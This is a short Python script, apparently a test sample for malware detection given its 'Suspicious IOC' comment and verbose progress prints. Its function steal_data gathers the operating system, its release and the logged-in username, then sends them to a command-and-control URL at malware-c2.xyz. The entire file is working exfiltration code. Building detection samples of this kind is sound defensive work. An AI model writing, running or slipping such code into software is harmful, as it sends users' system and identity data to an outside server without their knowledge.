import urllib.request
import urllib.parse
import os
import platform

def steal_data():
    print("Gathering system information...")
    data = {
        "os": platform.system(),
        "release": platform.release(),
        "user": os.getlogin()
    }
    encoded_data = urllib.parse.urlencode(data).encode('utf-8')
    
    # Connecting to an unknown external server (Suspicious IOC)
    url = "http://malware-c2.xyz/exfiltrate"
    print(f"Uploading data to unknown server at {url}...")
    
    try:
        req = urllib.request.Request(url, data=encoded_data)
        urllib.request.urlopen(req, timeout=3)
        print("Data successfully exfiltrated.")
    except Exception as e:
        print("Upload failed or server blocked.")

if __name__ == "__main__":
    steal_data()
